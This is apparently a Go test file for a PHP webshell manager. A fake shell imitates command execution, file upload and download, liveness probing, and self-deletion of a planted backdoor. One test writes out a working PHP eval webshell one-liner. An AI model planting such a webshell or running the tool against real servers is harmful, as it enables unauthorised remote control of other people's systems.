package webshell

// 测试用「假马」：一个 httptest 服务，按平台的载荷协议回应。
//
// 它不解释 PHP（测试环境没有 php 二进制），而是按协议特征识别请求：
//   - 载荷里有 file_put_contents → 写内存文件表，回 "OK:<字节数>"
//   - 载荷里有 file_get_contents → 读内存文件表，回 "OK|<大小>|<base64>"
//   - 载荷里有 unlink            → 删内存文件，回 "DEL|base64(path)"
//   - 载荷里有 __FILE__ 探测     → 回自身伪路径
//   - 载荷是纯 base64            → 当作 raw 模式命令
//   - 其它                       → 当作 eval 命令，回显 "ran:<命令>"
//
// 这样能验证的是「协议是否自洽」：命令有没有正确编码进载荷、标记有没有正确
// 派生与提取、分块回执能不能对上。这恰恰是最容易写错的部分。

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"
)

// fakeShell 模拟一个 eval 型 PHP 马。
type fakeShell struct {
	mu    sync.Mutex
	files map[string][]byte
	// selfPath 是「我自己在哪」的返回值。
	selfPath string
	// mode: eval / raw / block（返回拦截页）/ dead（404）
	mode string
	// blockOnce 让第一次请求成功、之后返回 404（模拟马被删掉）。
	dead bool
	// enforceSelf 为真时：selfPath 不在文件表里就返回 404（模拟「马被删了，
	// 这个 URL 就真的打不通了」）。
	enforceSelf bool
	// calls 记录收到的载荷次数，用于断言重试/探测行为。
	calls int
	// lastCmd 是最近一次执行到的命令。
	lastCmd string
}

var (
	b64InPayloadRE = regexp.MustCompile(`base64_decode\('([^']*)'\)`)
	markerOutRE    = regexp.MustCompile(`echo '(\<\<[0-9a-f]+b\>\>)'`)
	// 纯代码荷载里的单引号 echo（probe / 自定义代码）。
	simpleEchoRE = regexp.MustCompile(`echo '([^']*)';`)
	// phpDeleteCode 的路径数组：array('b64','b64')
	deleteArrayRE = regexp.MustCompile(`array\(([^)]*)\)`)
)

func newFakeShell() *fakeShell {
	return &fakeShell{files: map[string][]byte{}, selfPath: "/var/www/html/x.php", mode: "eval"}
}

func (f *fakeShell) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.calls++
	if f.dead {
		http.NotFound(w, r)
		return
	}
	if f.enforceSelf {
		if _, ok := f.files[f.selfPath]; !ok {
			http.NotFound(w, r)
			return
		}
	}
	if f.mode == "block" {
		w.WriteHeader(200)
		_, _ = w.Write([]byte(`<!DOCTYPE html><html><head><title>403</title></head><body>拦截</body></html>`))
		return
	}

	_ = r.ParseForm()
	var payload string
	for _, vs := range r.Form {
		if len(vs) > 0 {
			payload = vs[0]
			break
		}
	}
	m := markerOutRE.FindStringSubmatch(payload)
	marker := ""
	if len(m) > 1 {
		marker = m[1]
	}
	// 结束标记 = 开始标记把 b>> 换成 e>>
	end := strings.Replace(marker, "b>>", "e>>", 1)

	reply := func(text string) {
		if marker == "" {
			_, _ = w.Write([]byte(text))
			return
		}
		enc := base64.StdEncoding.EncodeToString([]byte(text))
		_, _ = w.Write([]byte(marker + enc + end))
	}

	// raw 模式：整段载荷就是 base64 命令。
	if !strings.Contains(payload, "base64_decode") && !strings.Contains(payload, "echo") {
		if raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(payload)); err == nil {
			f.lastCmd = string(raw)
			reply("ran:" + string(raw))
			return
		}
	}

	decoded := b64InPayloadRE.FindAllStringSubmatch(payload, -1)

	switch {
	case strings.Contains(payload, "file_put_contents"):
		if len(decoded) < 2 {
			reply("ERR:bad payload")
			return
		}
		path := mustB64(decoded[0][1])
		data, _ := base64.StdEncoding.DecodeString(decoded[1][1])
		f.files[path] = append(f.files[path], data...)
		reply(fmt.Sprintf("OK:%d", len(data)))

	case strings.Contains(payload, "file_get_contents"):
		if len(decoded) < 1 {
			reply("ERR:bad payload")
			return
		}
		path := mustB64(decoded[0][1])
		data, ok := f.files[path]
		if !ok {
			reply("ERR:not a file")
			return
		}
		reply(fmt.Sprintf("OK|%d|%s", len(data), base64.StdEncoding.EncodeToString(data)))

	case strings.Contains(payload, "unlink"):
		// phpDeleteCode 把路径放在 array('b64','b64') 里，再用变量做 unlink；
		// 所以不能只找 base64_decode('literal')，要把 array 里的项解出来。
		if am := deleteArrayRE.FindStringSubmatch(payload); len(am) > 1 {
			var lines []string
			for _, q := range strings.Split(am[1], ",") {
				q = strings.Trim(strings.TrimSpace(q), "'")
				if q == "" {
					continue
				}
				p := mustB64(q)
				if p == "" {
					continue
				}
				status := "KEEP"
				if _, ok := f.files[p]; ok {
					delete(f.files, p)
					status = "DEL"
				}
				lines = append(lines, status+"|"+base64.StdEncoding.EncodeToString([]byte(p)))
			}
			reply(strings.Join(lines, "\n"))
			return
		}
		// 自删：没有 array，直接删自身并回路径。
		delete(f.files, f.selfPath)
		reply(f.selfPath)

	case strings.Contains(payload, "__FILE__"):
		reply(f.selfPath)

	case strings.Contains(payload, "json_decode(base64_decode") && len(decoded) >= 1:
		// 批量执行载荷：解出命令数组，逐条模拟执行并回 base64(json(results))。
		var cmds []string
		if err := json.Unmarshal([]byte(mustB64(decoded[0][1])), &cmds); err != nil {
			reply("ERR:bad batch")
			return
		}
		items := make([]map[string]any, 0, len(cmds))
		for _, c := range cmds {
			f.lastCmd = c
			items = append(items, map[string]any{"code": 0, "out": "ran:" + c})
		}
		blob, _ := json.Marshal(items)
		reply(base64.StdEncoding.EncodeToString(blob))

	case len(decoded) >= 1:
		f.lastCmd = mustB64(decoded[0][1])
		reply("ran:" + f.lastCmd)

	case simpleEchoRE.MatchString(payload):
		// 纯代码荷载（ob_start();echo 'X';）：把 echo 的内容原样回给标记。
		reply(simpleEchoRE.FindStringSubmatch(payload)[1])

	default:
		reply("pong")
	}
}

func mustB64(s string) string {
	b, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return ""
	}
	return string(b)
}

func newTestManager(t *testing.T) *Manager {
	t.Helper()
	m, err := NewManager(t.TempDir())
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	return m
}

func startFake(t *testing.T, f *fakeShell) (*httptest.Server, string) {
	t.Helper()
	srv := httptest.NewServer(f)
	t.Cleanup(srv.Close)
	return srv, srv.URL + "/x.php"
}

func addSession(t *testing.T, m *Manager, name, rawURL, typ, param string) {
	t.Helper()
	if _, err := m.Add(AddOptions{
		Name: name, URL: rawURL, Type: typ, Param: param, TaskID: 7,
	}); err != nil {
		t.Fatalf("Add(%s): %v", name, err)
	}
}

func TestAddGetListAndRedact(t *testing.T) {
	m := newTestManager(t)
	url := "http://10.1.2.3/x.php?pass=SECRET"
	if _, err := m.Add(AddOptions{
		Name: "web-01", URL: url, Type: "php", Param: "cmd", TaskID: 7,
		RemotePath: "/var/www/x.php", Note: "边界机",
		Proxy:  "socks5h://user:pw@127.0.0.1:1080",
		Header: map[string]string{"X-Token": "abc"},
	}); err != nil {
		t.Fatal(err)
	}

	got, err := m.Get("web-01")
	if err != nil {
		t.Fatal(err)
	}
	if got.Param != "cmd" || got.Type != "php" {
		t.Fatalf("Get 返回不对: %+v", got)
	}

	views := m.List(7)
	if len(views) != 1 {
		t.Fatalf("List 数量 = %d", len(views))
	}
	v := views[0]
	// 投影必须脱敏：URL 的 query 值、代理账密、param 名都不能出现。
	if strings.Contains(v.URL, "SECRET") {
		t.Fatalf("列表 URL 泄漏了 query 值: %s", v.URL)
	}
	if strings.Contains(v.Proxy, "pw") {
		t.Fatalf("列表泄漏了代理口令: %s", v.Proxy)
	}
	if !v.ParamSet || !v.HasHeader || len(v.HeaderKeys) != 1 {
		t.Fatalf("投影字段不对: %+v", v)
	}

	// 跨任务不可见。
	if n := len(m.List(8)); n != 0 {
		t.Fatalf("任务隔离失效，别的任务看到 %d 条", n)
	}
}

func TestValidateRejects(t *testing.T) {
	m := newTestManager(t)
	cases := []AddOptions{
		{Name: "bad/name", URL: "http://a/x.php", Type: "php"},
		{Name: "ok", URL: "not-a-url", Type: "php"},
		{Name: "ok", URL: "http://a/x.php", Type: "perl"},
		{Name: "ok", URL: "http://a/x.php", Type: "php", Param: "9bad name"},
		{Name: "ok", URL: "http://a/x.php", Type: "php", Method: "PUT"},
	}
	for i, c := range cases {
		if _, err := m.Add(c); err == nil {
			t.Fatalf("第 %d 个非法输入被接受了: %+v", i+1, c)
		}
	}
}

func TestMarkersDerivedFromParam(t *testing.T) {
	a := Session{Param: "cmd"}
	b := Session{Param: "cmd"}
	c := Session{Param: "pass"}
	ab, ae := markers(a)
	bb, _ := markers(b)
	cb, _ := markers(c)

	if ab != bb {
		t.Fatal("同参数名应得到同一组标记")
	}
	if ab == cb {
		t.Fatal("不同参数名应得到不同标记")
	}
	if !strings.HasPrefix(ab, "<<") || !strings.HasSuffix(ae, ">>") {
		t.Fatalf("标记形态不对: %q %q", ab, ae)
	}

	// 变量名每次随机，且不同角色互不相同。
	n1 := varNames()
	n2 := varNames()
	if n1["c"] == n2["c"] {
		t.Fatal("两次生成的变量名相同（随机失效）")
	}
	seen := map[string]bool{}
	for _, v := range n1 {
		if seen[v] {
			t.Fatalf("同一次生成里变量名重复: %s", v)
		}
		seen[v] = true
	}
}

func TestExecEvalAndFallbackRaw(t *testing.T) {
	f := newFakeShell()
	_, rawURL := startFake(t, f)
	m := newTestManager(t)
	addSession(t, m, "s1", rawURL, "php", "cmd")

	res, err := m.Exec(context.Background(), "s1", "id", 5*time.Second)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if res.Mode != "eval" {
		t.Fatalf("模式 = %s，期望 eval", res.Mode)
	}
	if res.Output != "ran:id" {
		t.Fatalf("输出 = %q", res.Output)
	}

	// 只吃 base64 命令的马：eval 试探拿不到标记，应自动回退到 raw。
	f2 := newFakeShell()
	f2.mode = "rawonly"
	_, url2 := startFake2(t, f2)
	m2 := newTestManager(t)
	addSession(t, m2, "s2", url2, "php", "cmd")
	res2, err := m2.Exec(context.Background(), "s2", "whoami", 5*time.Second)
	if err != nil {
		t.Fatalf("回退执行失败: %v", err)
	}
	if res2.Mode != "raw" {
		t.Fatalf("回退后模式 = %s，期望 raw", res2.Mode)
	}
	if !strings.Contains(res2.Output, "whoami") {
		t.Fatalf("回退出 = %q", res2.Output)
	}
}

// startFake2 起一个「只吃 base64 命令」的假马（eval 请求返回静态页）。
func startFake2(t *testing.T, f *fakeShell) (*httptest.Server, string) {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = r.ParseForm()
		var payload string
		for _, vs := range r.Form {
			if len(vs) > 0 {
				payload = vs[0]
				break
			}
		}
		// eval 型请求（含 base64_decode 与标记）一律返回静态页：模拟「这不是 eval 马」。
		if strings.Contains(payload, "base64_decode") && strings.Contains(payload, "echo '") {
			_, _ = w.Write([]byte("welcome"))
			return
		}
		raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(payload))
		if err != nil {
			_, _ = w.Write([]byte("welcome"))
			return
		}
		f.mu.Lock()
		f.lastCmd = string(raw)
		f.mu.Unlock()
		_, _ = w.Write([]byte("ran:" + string(raw)))
	}))
	t.Cleanup(srv.Close)
	return srv, srv.URL + "/x.php"
}

func TestUploadDownloadRoundTrip(t *testing.T) {
	f := newFakeShell()
	_, rawURL := startFake(t, f)
	m := newTestManager(t)
	addSession(t, m, "s1", rawURL, "php", "cmd")
	ctx := context.Background()

	payload := []byte(strings.Repeat("A", 1000))
	up, err := m.Upload(ctx, "s1", "/tmp/up.bin", payload, 4096, 5*time.Second)
	if err != nil {
		t.Fatalf("Upload: %v", err)
	}
	if up.Bytes != 1000 || up.Chunks != 1 {
		t.Fatalf("上传结果 = %+v", up)
	}
	if got := string(f.files["/tmp/up.bin"]); got != string(payload) {
		t.Fatalf("远端内容长度 = %d", len(got))
	}

	down, err := m.Download(ctx, "s1", "/tmp/up.bin", 0, 5*time.Second)
	if err != nil {
		t.Fatalf("Download: %v", err)
	}
	if string(down.Data) != string(payload) {
		t.Fatalf("下载内容不一致: %d vs %d", len(down.Data), len(payload))
	}
	if down.Truncated {
		t.Fatal("不该标记截断")
	}

	// 上传过的文件要记进 artifacts（受管清理依赖它）。
	sess, _ := m.Get("s1")
	if len(sess.Artifacts) != 1 || sess.Artifacts[0] != "/tmp/up.bin" {
		t.Fatalf("artifacts = %v", sess.Artifacts)
	}

	// 多块上传（块大小 4KB 下限，用 12KB 走 3 块）。
	big := []byte(strings.Repeat("B", 12288))
	if _, err := m.Upload(ctx, "s1", "/tmp/big.bin", big, 4096, 10*time.Second); err != nil {
		t.Fatalf("分块上传: %v", err)
	}
	if got := len(f.files["/tmp/big.bin"]); got != 12288 {
		t.Fatalf("分块后远端大小 = %d", got)
	}
}

func TestProbeStates(t *testing.T) {
	ctx := context.Background()

	// 正常
	f := newFakeShell()
	_, u := startFake(t, f)
	m := newTestManager(t)
	addSession(t, m, "ok", u, "php", "cmd")
	r, err := m.Probe(ctx, "ok", true, 5*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	if !r.Alive || r.State != "ok" {
		t.Fatalf("正常会话判定错: %+v", r)
	}
	if r.Identity == "" {
		t.Fatal("deep 探针没拿到身份")
	}

	// 不是我的马（拦截页）
	fb := newFakeShell()
	fb.mode = "block"
	_, ub := startFake(t, fb)
	addSession(t, m, "blocked", ub, "php", "cmd")
	rb, _ := m.Probe(ctx, "blocked", false, 5*time.Second)
	if rb.Alive || rb.State != "not_mine" {
		t.Fatalf("拦截页应判 not_mine: %+v", rb)
	}

	// 连不上
	addSession(t, m, "dead", "http://127.0.0.1:1/x.php", "php", "cmd")
	rd, _ := m.Probe(ctx, "dead", false, 2*time.Second)
	if rd.Alive || rd.State != "unreachable" {
		t.Fatalf("不可达应判 unreachable: %+v", rd)
	}
}

func TestPurgeLocalOnlyByDefault(t *testing.T) {
	f := newFakeShell()
	f.files["/var/www/x.php"] = []byte("<?php ?>")
	_, u := startFake(t, f)
	m := newTestManager(t)
	addSession(t, m, "s1", u, "php", "cmd")

	res, err := m.Purge(context.Background(), "s1", PurgeOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if !res.LocalRemoved || res.RemoteTouched {
		t.Fatalf("默认应只摘登记: %+v", res)
	}
	if _, ok := f.files["/var/www/x.php"]; !ok {
		t.Fatal("默认不该动远端文件")
	}
	if _, err := m.Get("s1"); err == nil {
		t.Fatal("登记应已摘除")
	}
}

func TestPurgeRemoveRemote(t *testing.T) {
	f := newFakeShell()
	f.files["/var/www/html/x.php"] = []byte("<?php ?>")
	f.files["/tmp/artifact.txt"] = []byte("left-over")
	f.enforceSelf = true
	_, u := startFake(t, f)
	m := newTestManager(t)
	if _, err := m.Add(AddOptions{
		Name: "s1", URL: u, Type: "php", Param: "cmd", TaskID: 7,
		RemotePath: "/var/www/html/x.php",
	}); err != nil {
		t.Fatal(err)
	}
	m.AddArtifact("s1", "/tmp/artifact.txt")

	res, err := m.Purge(context.Background(), "s1", PurgeOptions{RemoveRemote: true, Timeout: 5 * time.Second})
	if err != nil {
		t.Fatal(err)
	}
	if !res.RemoteTouched {
		t.Fatal("应标记动过远端")
	}
	if _, ok := f.files["/tmp/artifact.txt"]; ok {
		t.Fatalf("artifacts 没删掉: %+v", res.Items)
	}
	if !res.LocalRemoved {
		t.Fatalf("清理后应摘登记: %+v", res)
	}
}

func TestTemplatesBuiltinAndDir(t *testing.T) {
	list := ListTemplates()
	if len(list) < 3 {
		t.Fatalf("内置模板太少: %d", len(list))
	}
	var found bool
	for _, tp := range list {
		if tp.Name == "builtin/php-eval" {
			found = true
			if !strings.Contains(tp.Body(), ParamPlaceholder) {
				t.Fatal("模板应含占位符")
			}
			out := tp.Render("xyz")
			if !strings.Contains(out, "xyz") || strings.Contains(out, ParamPlaceholder) {
				t.Fatalf("渲染失败: %s", out)
			}
		}
	}
	if !found {
		t.Fatal("找不到内置 php-eval")
	}

	// 自备库覆盖 + 文件头元信息剥离
	dir := t.TempDir()
	sub := filepath.Join(dir, "php")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	content := "/*\n * @summary 自备马\n * @scene 测试\n */\n<?php @eval($_POST['" + ParamPlaceholder + "']);?>"
	if err := os.WriteFile(filepath.Join(sub, "mine.php"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv(PayloadDirEnv, dir)

	tp, err := GetTemplate("php/mine.php")
	if err != nil {
		t.Fatal(err)
	}
	if tp.Summary != "自备马" {
		t.Fatalf("元信息解析失败: %+v", tp)
	}
	if strings.Contains(tp.Body(), "@summary") {
		t.Fatal("下发内容不该带说明书注释")
	}
	if !strings.HasPrefix(strings.TrimSpace(tp.Body()), "<?php") {
		t.Fatalf("剥离后应以 <?php 开头: %q", tp.Body())
	}
}

func TestProxyValidation(t *testing.T) {
	good := []string{
		"socks5h://127.0.0.1:1080",
		"http://user:pw@proxy:8080",
		"socks5://a:1080,http://b:3128",
	}
	for _, g := range good {
		if err := ValidateProxy(g); err != nil {
			t.Fatalf("合法代理被判非法(%s): %v", g, err)
		}
	}
	bad := []string{"ftp://x:1", "127.0.0.1:1080", "socks5://"}
	for _, b := range bad {
		if err := ValidateProxy(b); err == nil {
			t.Fatalf("非法代理被接受: %s", b)
		}
	}
	if got := pickProxy("socks5://a:1,socks5://b:2", "http://x/y", false); got == "" {
		t.Fatal("固定选择应返回一个代理")
	}
}

func TestAutoNameAndStorePersistence(t *testing.T) {
	dir := t.TempDir()
	m, err := NewManager(dir)
	if err != nil {
		t.Fatal(err)
	}
	v, err := m.Add(AddOptions{URL: "http://10.0.0.9:8080/a.php", Type: "php", Param: "p", TaskID: 1})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(v.Name, "10.0.0.9") {
		t.Fatalf("自动名不含主机: %s", v.Name)
	}
	// 重新打开应读回同一条（磁盘是真相源）。
	m2, err := NewManager(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(m2.List(1)) != 1 {
		t.Fatal("重启后会话丢失")
	}
	// 文件权限必须是 0600（Windows 不支持 POSIX 权限位，只在类 Unix 上断言）。
	if runtime.GOOS != "windows" {
		st, err := os.Stat(filepath.Join(dir, StoreName))
		if err != nil {
			t.Fatal(err)
		}
		if perm := st.Mode().Perm(); perm != 0o600 {
			t.Fatalf("会话库权限 = %o，期望 600", perm)
		}
	}
}

func TestUpdateKeepsParamWhenEmpty(t *testing.T) {
	f := newFakeShell()
	_, u := startFake(t, f)
	m := newTestManager(t)
	addSession(t, m, "s1", u, "php", "cmd")

	// 前端不展示旧 param，留空表示「保持原样」。
	if _, err := m.Update("s1", func(s *Session) {
		s.Note = "改了备注"
	}); err != nil {
		t.Fatal(err)
	}
	s, _ := m.Get("s1")
	if s.Param != "cmd" {
		t.Fatalf("param 被清空了: %q", s.Param)
	}
	if s.Note != "改了备注" {
		t.Fatalf("note 没更新: %q", s.Note)
	}
}

func TestBlockedResponseNotTreatedAsOutput(t *testing.T) {
	f := newFakeShell()
	f.mode = "block"
	_, u := startFake(t, f)
	m := newTestManager(t)
	addSession(t, m, "s1", u, "php", "cmd")

	_, err := m.Exec(context.Background(), "s1", "id", 3*time.Second)
	if err == nil {
		t.Fatal("拦截页必须报错，不能当成命令回显")
	}
	if !strings.Contains(err.Error(), "拦截") {
		t.Fatalf("错误信息应指出拦截页: %v", err)
	}
}

// 防止 url 包被误删（httptest 的 URL 解析在别处用到）。
var _ = url.Parse
